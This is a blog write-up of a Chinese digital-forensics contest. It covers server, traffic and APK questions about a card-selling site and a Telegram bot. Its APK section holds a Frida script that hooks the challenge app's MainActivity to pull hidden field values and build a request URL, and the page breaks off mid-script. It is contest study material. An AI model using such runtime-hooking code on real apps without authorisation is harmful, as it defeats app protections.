@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+  <head>
+    
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2025数证杯初赛 | JerryXie&#39;s Blog</title>
+<meta name="description" content="CTF, digital forensics, offensive security, and study notes.">
+<meta name="theme-color" content="#f5f5f7">
+<meta name="referrer" content="no-referrer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025数证杯初赛 | JerryXie&#39;s Blog">
+<meta property="og:description" content="CTF, digital forensics, offensive security, and study notes.">
+
+  <meta property="og:url" content="https://jerryxie.top/notes/电子取证/2025数证杯/2025数证杯初赛/">
+  <link rel="canonical" href="https://jerryxie.top/notes/电子取证/2025数证杯/2025数证杯初赛/">
+
+
+  <meta name="author" content="JerryXie">
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="/js/main.js"></script>
+
+  <meta name="generator" content="Hexo 8.1.1"></head>
+  <body>
+    <div class="scroll-progress" data-scroll-progress></div>
+    <div class="site-shell">
+      
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark"></span>
+      <span class="brand-name">JerryXie&#39;s Blog</span>
+    </a>
+
+    <button class="menu-toggle" type="button" data-menu-toggle aria-label="Toggle navigation">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="site-nav" data-menu-panel>
+      
+        <a href="/" class="">Home</a>
+      
+        <a href="/archives/" class="">Archive</a>
+      
+        <a href="/categories/" class="">Library</a>
+      
+        <a href="/about/" class="">About</a>
+      
+    </nav>
+
+    <button class="theme-toggle" type="button" data-theme-toggle aria-label="Toggle theme">
+      <span data-theme-icon>Dark</span>
+    </button>
+  </div>
+</header>
+
+      <main class="page-shell">
+        
+
+<article class="article-layout">
+  <div class="article-main card-panel">
+    <a class="back-link" href="/categories/">Back to library</a>
+    <header class="article-header">
+      <div class="article-badges">
+        
+          
+            <a class="category-chip" href="/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">电子取证</a>
+          
+            <a class="category-chip" href="/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2025%E6%95%B0%E8%AF%81%E6%9D%AF/">2025数证杯</a>
+          
+        
+      </div>
+      <h1>2025数证杯初赛</h1>
+      <div class="article-meta">
+        <span>Published 2026-04-19</span>
+        <span>Updated 2026-04-19</span>
+        <span>85 min</span>
+      </div>
+      
+        <p class="article-source">Source path: <code>电子取证/2025数证杯/2025数证杯初赛.md</code></p>
+      
+    </header>
+
+    <div class="article-content">
+      <h1 id="服务器取证"><a href="#服务器取证" class="headerlink" title="服务器取证"></a>服务器取证</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/APyP-mcd40kGCn2U1RKrZA">2025数证杯初赛参考解题思路（详细版）</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WLjan3_m6nBqb2uJ1v1d6w">https://mp.weixin.qq.com/s/WLjan3_m6nBqb2uJ1v1d6w</a></p>
+<h2 id="1、node1节点的磁盘设备SHA256值前六位是？-字母全大写，答案格式：AAAAAA-（-）"><a href="#1、node1节点的磁盘设备SHA256值前六位是？-字母全大写，答案格式：AAAAAA-（-）" class="headerlink" title="1、node1节点的磁盘设备SHA256值前六位是？(字母全大写，答案格式：AAAAAA)（ ）"></a>1、node1节点的磁盘设备SHA256值前六位是？(字母全大写，答案格式：AAAAAA)（ ）</h2><h2 id="2、集群配置了多少个node节点？（答案格式：1）（-）"><a href="#2、集群配置了多少个node节点？（答案格式：1）（-）" class="headerlink" title="2、集群配置了多少个node节点？（答案格式：1）（ ）"></a>2、集群配置了多少个node节点？（答案格式：1）（ ）</h2><h2 id="3、嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00-00-00）（-）"><a href="#3、嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00-00-00）（-）" class="headerlink" title="3、嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00:00:00）（ ）"></a>3、嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00:00:00）（ ）</h2><h2 id="4、Docker的安装日期是？（使用双位数格式，答案格式：01月01日）（-）"><a href="#4、Docker的安装日期是？（使用双位数格式，答案格式：01月01日）（-）" class="headerlink" title="4、Docker的安装日期是？（使用双位数格式，答案格式：01月01日）（ ）"></a>4、Docker的安装日期是？（使用双位数格式，答案格式：01月01日）（ ）</h2><h2 id="5、Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）（-）"><a href="#5、Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）（-）" class="headerlink" title="5、Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）（ ）"></a>5、Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）（ ）</h2><h2 id="6、发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）（-）"><a href="#6、发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）（-）" class="headerlink" title="6、发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）（ ）"></a>6、发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）（ ）</h2><h2 id="7、发卡网站部署使用的镜像名称是？（答案格式：root-root）（-）"><a href="#7、发卡网站部署使用的镜像名称是？（答案格式：root-root）（-）" class="headerlink" title="7、发卡网站部署使用的镜像名称是？（答案格式：root&#x2F;root）（ ）"></a>7、发卡网站部署使用的镜像名称是？（答案格式：root&#x2F;root）（ ）</h2><h2 id="8、当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）（-）"><a href="#8、当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）（-）" class="headerlink" title="8、当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）（ ）"></a>8、当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）（ ）</h2><h2 id="9、发卡网站使用的缓存数据库是？（答案格式：mysql）（-）"><a href="#9、发卡网站使用的缓存数据库是？（答案格式：mysql）（-）" class="headerlink" title="9、发卡网站使用的缓存数据库是？（答案格式：mysql）（ ）"></a>9、发卡网站使用的缓存数据库是？（答案格式：mysql）（ ）</h2><h2 id="10、集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：-root-root）（-）"><a href="#10、集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：-root-root）（-）" class="headerlink" title="10、集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：&#x2F;root&#x2F;root）（ ）"></a>10、集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：&#x2F;root&#x2F;root）（ ）</h2><h2 id="11、Telegram群管机器人配置的API代理域名是？（答案格式：www-xxx-com）（-）"><a href="#11、Telegram群管机器人配置的API代理域名是？（答案格式：www-xxx-com）（-）" class="headerlink" title="11、Telegram群管机器人配置的API代理域名是？（答案格式：www.xxx.com）（ ）"></a>11、Telegram群管机器人配置的API代理域名是？（答案格式：<a target="_blank" rel="noopener" href="https://yuanbao.tencent.com/chat/naQivTmsDa/www.xxx.com">www.xxx.com</a>）（ ）</h2><h2 id="12、嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）（-）"><a href="#12、嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）（-）" class="headerlink" title="12、嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）（ ）"></a>12、嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）（ ）</h2><h2 id="13、统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）（-）"><a href="#13、统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）（-）" class="headerlink" title="13、统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）（ ）"></a>13、统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）（ ）</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="14、据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）（-）"><a href="#14、据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）（-）" class="headerlink" title="14、据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）（ ）"></a>14、据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）（ ）</h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="15、发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）（-）"><a href="#15、发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）（-）" class="headerlink" title="15、发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）（ ）"></a>15、发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）（ ）</h2><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="16、发卡网站的后台访问路径是？（答案格式：-root）（-）"><a href="#16、发卡网站的后台访问路径是？（答案格式：-root）（-）" class="headerlink" title="16、发卡网站的后台访问路径是？（答案格式：&#x2F;root）（ ）"></a>16、发卡网站的后台访问路径是？（答案格式：&#x2F;root）（ ）</h2><h2 id="17、计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）（-）"><a href="#17、计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）（-）" class="headerlink" title="17、计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）（ ）"></a>17、计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）（ ）</h2><h2 id="18、发卡网站配置的邮件发送人地址是？（答案格式：abc-abc-com）（-）"><a href="#18、发卡网站配置的邮件发送人地址是？（答案格式：abc-abc-com）（-）" class="headerlink" title="18、发卡网站配置的邮件发送人地址是？（答案格式：abc@abc.com）（ ）"></a>18、发卡网站配置的邮件发送人地址是？（答案格式：<a href="mailto:&#97;&#x62;&#x63;&#64;&#x61;&#98;&#x63;&#46;&#x63;&#x6f;&#109;">abc@abc.com</a>）（ ）</h2><h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><h2 id="19、当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1-1-1）（-）"><a href="#19、当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1-1-1）（-）" class="headerlink" title="19、当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1.1.1）（ ）"></a>19、当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1.1.1）（ ）</h2><h2 id="20、当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）（-）"><a href="#20、当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）（-）" class="headerlink" title="20、当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）（ ）"></a>20、当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）（ ）</h2><h1 id="流量包分析"><a href="#流量包分析" class="headerlink" title="流量包分析"></a>流量包分析</h1><p>详见专题。</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/jerry-nunfc/sfflkp/vezg7qlltg02g2hn#KSvlv">25数证杯初赛</a></p>
+<h1 id="APK程序分析"><a href="#APK程序分析" class="headerlink" title="APK程序分析"></a>APK程序分析</h1><h2 id="31、apk-的版本名称为？-（答案格式：1-1-1）（-）"><a href="#31、apk-的版本名称为？-（答案格式：1-1-1）（-）" class="headerlink" title="31、apk 的版本名称为？ （答案格式：1.1.1）（ ）"></a>31、apk 的版本名称为？ （答案格式：1.1.1）（ ）</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762254139804-8c2848d5-7281-4b2d-a10b-844ff443a81a.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><code>3.0.12</code></p>
+<h2 id="32、在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）（-）"><a href="#32、在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）（-）" class="headerlink" title="32、在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）（ ）"></a>32、在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）（ ）</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762254680043-2dc3de5f-961f-45ce-9bcf-62a832ee1bbd.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>currentTimeMillis()</p>
+<h2 id="33、apk运行后getVer-的返回值是多少？（答案格式：1-0-0）（-）"><a href="#33、apk运行后getVer-的返回值是多少？（答案格式：1-0-0）（-）" class="headerlink" title="33、apk运行后getVer()的返回值是多少？（答案格式：1.0.0）（ ）"></a>33、apk运行后getVer()的返回值是多少？（答案格式：1.0.0）（ ）</h2><h2 id="34、apk运行后需要通过一个http-get请求才能打开第二个界面，给出该请求URL？-（答案格式：http-www-xxx-com-test-a-1）（-）"><a href="#34、apk运行后需要通过一个http-get请求才能打开第二个界面，给出该请求URL？-（答案格式：http-www-xxx-com-test-a-1）（-）" class="headerlink" title="34、apk运行后需要通过一个http get请求才能打开第二个界面，给出该请求URL？ （答案格式：http://www.xxx.com/test?a=1）（ ）"></a>34、apk运行后需要通过一个http get请求才能打开第二个界面，给出该请求URL？ （答案格式：<a target="_blank" rel="noopener" href="http://www.xxx.com/test?a=1">http://www.xxx.com/test?a=1</a>）（ ）</h2><p>33+34</p>
+<p>问题、源码给ai即可</p>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line">    console.log(<span class="string">&quot;[*] 开始分析 APK - 修正版本...&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    // 方法<span class="number">1</span>: 使用 enumerateClassLoaders 来查找类</span><br><span class="line">    function findAndUseClass() &#123;</span><br><span class="line">        console.log(<span class="string">&quot;[*] 尝试枚举类加载器查找类...&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Java.enumerateClassLoaders(&#123;</span><br><span class="line">            onMatch: function(loader) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    // 尝试设置当前类加载器</span><br><span class="line">                    Java.classFactory.loader = loader;</span><br><span class="line">                    </span><br><span class="line">                    // 尝试加载 MainActivity 类</span><br><span class="line">                    var MainActivity = Java.use(<span class="string">&quot;net.net.MainActivity&quot;</span>);</span><br><span class="line">                    console.log(<span class="string">&quot;[+] 成功找到 MainActivity 类&quot;</span>);</span><br><span class="line">                    </span><br><span class="line">                    // 获取静态字段值</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        var tsValue = MainActivity.ts.value;</span><br><span class="line">                        var apkHashValue = MainActivity.apkHash.value;</span><br><span class="line">                        console.log(<span class="string">&quot;[+] ts 值: &quot;</span> + tsValue);</span><br><span class="line">                        console.log(<span class="string">&quot;[+] apkHash 值: &quot;</span> + apkHashValue);</span><br><span class="line">                        </span><br><span class="line">                        // 尝试调用 getVer()</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            var verValue = MainActivity.getVer();</span><br><span class="line">                            console.log(<span class="string">&quot;[+] getVer() 返回值: &quot;</span> + verValue);</span><br><span class="line">                        &#125; catch (e) &#123;</span><br><span class="line">                            console.log(<span class="string">&quot;[-] 调用 getVer() 失败: &quot;</span> + e);</span><br><span class="line">                        &#125;</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">return</span> true; // 找到类，停止枚举</span><br><span class="line">                    &#125; catch (e) &#123;</span><br><span class="line">                        console.log(<span class="string">&quot;[-] 获取字段值失败: &quot;</span> + e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (e) &#123;</span><br><span class="line">                    // 这个加载器没有找到类，继续尝试下一个</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function() &#123;</span><br><span class="line">                console.log(<span class="string">&quot;[*] 类加载器枚举完成&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 方法<span class="number">2</span>: 直接尝试使用已知的类加载器</span><br><span class="line">    function tryDirectAccess() &#123;</span><br><span class="line">        console.log(<span class="string">&quot;[*] 尝试直接访问...&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            // 尝试通过应用程序上下文获取类加载器</span><br><span class="line">            var context = Java.use(<span class="string">&quot;android.app.ActivityThread&quot;</span>).currentApplication().getApplicationContext();</span><br><span class="line">            var classLoader = context.getClassLoader();</span><br><span class="line">            Java.classFactory.loader = classLoader;</span><br><span class="line">            </span><br><span class="line">            var MainActivity = Java.use(<span class="string">&quot;net.net.MainActivity&quot;</span>);</span><br><span class="line">            console.log(<span class="string">&quot;[+] 通过应用上下文找到 MainActivity&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            // 获取值</span><br><span class="line">            getValues(MainActivity);</span><br><span class="line">            </span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            console.log(<span class="string">&quot;[-] 直接访问失败: &quot;</span> + e);</span><br><span class="line">            findAndUseClass(); // 回退到枚举方法</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 方法<span class="number">3</span>: 通过已加载的类实例获取</span><br><span class="line">    function findThroughInstances() &#123;</span><br><span class="line">        console.log(<span class="string">&quot;[*] 尝试通过实例查找...&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Java.choose(<span class="string">&quot;net.net.MainActivity&quot;</span>, &#123;</span><br><span class="line">            onMatch: function(instance) &#123;</span><br><span class="line">                console.log(<span class="string">&quot;[+] 找到 MainActivity 实例&quot;</span>);</span><br><span class="line">                </span><br><span class="line">                // 获取类引用</span><br><span class="line">                var mainActivityClass = instance.getClass();</span><br><span class="line">                </span><br><span class="line">                // 获取静态字段</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var tsField = mainActivityClass.getDeclaredField(<span class="string">&quot;ts&quot;</span>);</span><br><span class="line">                    tsField.setAccessible(true);</span><br><span class="line">                    var tsValue = tsField.get(null);</span><br><span class="line">                    console.log(<span class="string">&quot;[+] ts 值: &quot;</span> + tsValue);</span><br><span class="line">                    </span><br><span class="line">                    var apkHashField = mainActivityClass.getDeclaredField(<span class="string">&quot;apkHash&quot;</span>);</span><br><span class="line">                    apkHashField.setAccessible(true);</span><br><span class="line">                    var apkHashValue = apkHashField.get(null);</span><br><span class="line">                    console.log(<span class="string">&quot;[+] apkHash 值: &quot;</span> + apkHashValue);</span><br><span class="line">                    </span><br><span class="line">                &#125; catch (e) &#123;</span><br><span class="line">                    console.log(<span class="string">&quot;[-] 反射获取字段失败: &quot;</span> + e);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> true; // 找到一个实例就停止</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function() &#123;</span><br><span class="line">                console.log(<span class="string">&quot;[*] 实例查找完成&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 获取值的通用函数</span><br><span class="line">    function getValues(MainActivityClass) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            // 获取静态字段</span><br><span class="line">            var tsValue = MainActivityClass.ts.value;</span><br><span class="line">            var apkHashValue = MainActivityClass.apkHash.value;</span><br><span class="line">            console.log(<span class="string">&quot;[+] 获取到的值:&quot;</span>);</span><br><span class="line">            console.log(<span class="string">&quot;    ts: &quot;</span> + tsValue);</span><br><span class="line">            console.log(<span class="string">&quot;    apkHash: &quot;</span> + apkHashValue);</span><br><span class="line">            </span><br><span class="line">            // 尝试调用 getVer</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var verValue = MainActivityClass.getVer();</span><br><span class="line">                console.log(<span class="string">&quot;    getVer(): &quot;</span> + verValue);</span><br><span class="line">            &#125; catch (e) &#123;</span><br><span class="line">                console.log(<span class="string">&quot;[-] 调用 getVer 失败: &quot;</span> + e);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            // 尝试计算加密路径</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var MultiLayerEncryption = Java.use(<span class="string">&quot;net.net.crypto.MultiLayerEncryption&quot;</span>);</span><br><span class="line">                var encryptedPath = MultiLayerEncryption.multiLayerEncrypt(<span class="string">&quot;check_apk_status&quot;</span>);</span><br><span class="line">                console.log(<span class="string">&quot;    加密路径: &quot;</span> + encryptedPath);</span><br><span class="line">                </span><br><span class="line">                // 构建URL</span><br><span class="line">                <span class="keyword">if</span> (verValue &amp;&amp; apkHashValue &amp;&amp; tsValue) &#123;</span><br><span class="line">                    var url = <span class="string">&quot;http://localhost:60723/&quot;</span> + encryptedPath + </span><br><span class="line">                             <span class="string">&quot;?hash=&quot;</span> + apkHashValue + <span class="string">&quot;&amp;ver=&quot;</span> + verValue + <span class="string">&quot;&amp;ts=&quot;</span> + tsValue;</span><br><span class="line">                    console.log(<span class="string">&quot;\n🎯 完整URL: &quot;</span> + url);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (e) &#123;</span><br><span class="line">                console.log(<span class="string">&quot;[-] 加密路径计算失败: &quot;</span> + e);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            console.log(<span class="string">&quot;[-] 获取值失败: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 主执行逻辑</span><br><span class="line">    setTimeout(function() &#123;</span><br><span class="line">        console.log(<span class="string">&quot;[*] 延迟执行，等待类加载...&quot;</span>);</span><br><span class="line">        tryDirectAccess();</span><br><span class="line">    &#125;, <span class="number">3000</span>); // 延迟<span class="number">3</span>秒等待应用初始化</span><br><span class="line">    </span><br><span class="line">    // 备用方案：定时重试</span><br><span class="line">    var retryCount = <span class="number">0</span>;</span><br><span class="line">    var maxRetries = <span class="number">5</span>;</span><br><span class="line">    var retryInterval = setInterval(function() &#123;</span><br><span class="line">        <span class="keyword">if</span> (retryCount &gt;= maxRetries) &#123;</span><br><span class="line">            clearInterval(retryInterval);</span><br><span class="line">            console.log(<span class="string">&quot;[-] 达到最大重试次数，尝试通过实例查找...&quot;</span>);</span><br><span class="line">            findThroughInstances();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        retryCount++;</span><br><span class="line">        console.log(<span class="string">&quot;[*] 第 &quot;</span> + retryCount + <span class="string">&quot; 次重试...&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var MainActivity = Java.use(<span class="string">&quot;net.net.MainActivity&quot;</span>);</span><br><span class="line">            console.log(<span class="string">&quot;[+] 重试成功，找到 MainActivity 类&quot;</span>);</span><br><span class="line">            getValues(MainActivity);</span><br><span class="line">            clearInterval(retryInterval);</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            console.log(<span class="string">&quot;[-] 重试失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 简化版本：直接暴力尝试</span><br><span class="line">function simpleTry() &#123;</span><br><span class="line">    Java.perform(function() &#123;</span><br><span class="line">        console.log(<span class="string">&quot;[*] 使用简化暴力尝试...&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        // 尝试所有已知的类加载器</span><br><span class="line">        Java.enumerateClassLoaders(&#123;</span><br><span class="line">            onMatch: function(loader) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Java.classFactory.loader = loader;</span><br><span class="line">                    </span><br><span class="line">                    // 尝试加载 MainActivity</span><br><span class="line">                    var MainActivity = Java.use(<span class="string">&quot;net.net.MainActivity&quot;</span>);</span><br><span class="line">                    console.log(<span class="string">&quot;[+] 找到 MainActivity!&quot;</span>);</span><br><span class="line">                    </span><br><span class="line">                    // 立即获取值</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        console.log(<span class="string">&quot;[+] ts: &quot;</span> + MainActivity.ts.value);</span><br><span class="line">                        console.log(<span class="string">&quot;[+] apkHash: &quot;</span> + MainActivity.apkHash.value);</span><br><span class="line">                        </span><br><span class="line">                        var ver = MainActivity.getVer();</span><br><span class="line">                        console.log(<span class="string">&quot;[+] getVer(): &quot;</span> + ver);</span><br><span class="line">                        